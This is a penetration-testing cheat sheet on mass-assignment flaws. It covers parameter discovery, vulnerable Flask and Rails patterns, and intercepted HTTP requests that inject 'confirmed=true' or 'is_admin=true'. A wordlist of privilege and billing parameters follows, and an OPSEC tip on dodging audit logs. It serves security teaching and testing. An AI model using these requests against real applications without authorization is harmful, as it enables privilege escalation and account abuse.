# Mass Assignment (Auto-Binding)
**Concept:** Mass Assignment occurs when an application automatically binds user input (HTTP parameters) to internal code objects or database fields without filtering. 
**Risk:** Attackers can modify restricted attributes (e.g., `is_admin`, `role`, `account_balance`) by guessing parameter names and injecting them into the request. 
**Context:** Common in frameworks like Ruby on Rails, NodeJS, ASP.NET MVC, and Python Flask.
## 1. Reconnaissance (Parameter Discovery)
**Goal:** Identify potential hidden or restricted fields that exist in the backend model but are not exposed in the frontend form.
### Method A: Response Analysis (Passive)
Inspect JSON API responses or previous GET requests. Often, the server returns the _full_ object (including restricted fields) even if the frontend doesn't display them.
- **Scenario:** You request user details: `GET /api/user/me`
- **Response:** 
```json
{
  "id": 105,
  "username": "guest",
  "email": "guest@corp.local",
  "is_admin": false,
  "confirmed": false
}
```
- **Analysis:** The fields `is_admin` and `confirmed` exist in the model.
### Method B: Source Code Review (Whitebox)
If code is accessible (e.g., Open Source or Leaked), look for direct binding of request objects.
- **Python (Flask) Example:**
```python
# Vulnerable Pattern
if request.form['confirmed']: # Checks if parameter exists in input
	cond=True
```
- **Ruby on Rails Example:**
```ruby
# Vulnerable Pattern
User.create(params[:user]) # Binds ALL parameters to the User object
```
## 2. Exploitation: Privilege Escalation
**Goal:** Modify the state of the account (e.g., Admin rights, Confirmation status) during creation or update.
### Scenario: Registration Bypass
**Context:** The application holds new accounts in a "Pending" state (`confirmed=false`) until an admin approves them. The code checks for a `confirmed` parameter during registration.
1. **Capture Traffic:** Intercept the legitimate registration request in Burp Suite.
```http
POST /register HTTP/1.1
...
username=attacker&password=Test1234
```
2. **Inject Parameter:** Append the restricted parameter identified during Reconnaissance.
```http
POST /register HTTP/1.1
...
username=attacker&password=Test1234&confirmed=true
```
_Note:_ Try various formats depending on the framework: `true`, `1`, `on`.        
3. **Verify:** Login with the new credentials. If the "Pending Approval" check is bypassed, the exploitation is successful.
### Scenario: Vertical Escalation (Admin)
**Context:** Promoting a user to Admin during profile update.
1. **Intercept Update:** Catch the profile update request (e.g., `PUT /api/user/105`).
2. **Fuzz Parameters:** Add common administrative parameter names.
    - `is_admin=true`
    - `role=admin`
    - `groups=["admin"]`
    - `isAdmin=1`
3. **OPSEC Warning:** Modifying your own role to `admin` is extremely noisy and often logged in audit trails. If possible, create a secondary "throwaway" account for this test.
## 3. Common Targets (Wordlist)
When fuzzing for Mass Assignment, use these common parameter names:

| **Category**       | **Parameters**                                                                  |
| ------------------ | ------------------------------------------------------------------------------- |
| *Privilege*      | `admin`, `is_admin`, `is_staff`, `role`, `roles`, `account_type`, `privilege`   |
| *Status*         | `confirmed`, `active`, `verified`, `approved`, `state`, `status`                |
| *Identity*       | `id`, `user_id`, `uid`, `guid`, `uuid` (Try changing IDORs via Mass Assignment) |
| *Business Logic* | `balance`, `credits`, `subscription`, `plan`, `tier`                            |
